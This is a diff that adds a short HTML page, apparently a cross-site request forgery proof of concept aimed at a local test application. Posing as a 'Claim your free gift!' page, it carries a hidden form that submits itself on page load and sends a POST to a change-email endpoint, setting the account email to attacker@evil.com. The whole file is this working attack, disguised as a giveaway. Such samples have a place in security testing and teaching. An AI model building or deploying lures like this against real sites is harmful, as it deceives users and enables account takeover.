@@ -1,0 +1,12 @@
+﻿<!DOCTYPE html>
+<html>
+<head><title>Free Gift!</title></head>
+<body>
+    <h1>Claim your free gift!</h1>
+    <p>Redirecting...</p>
+    <form id="csrf" action="http://localhost:3001/api/change-email" method="POST">
+        <input type="hidden" name="email" value="attacker@evil.com" />
+    </form>
+    <script>document.getElementById('csrf').submit();</script>
+</body>
+</html>
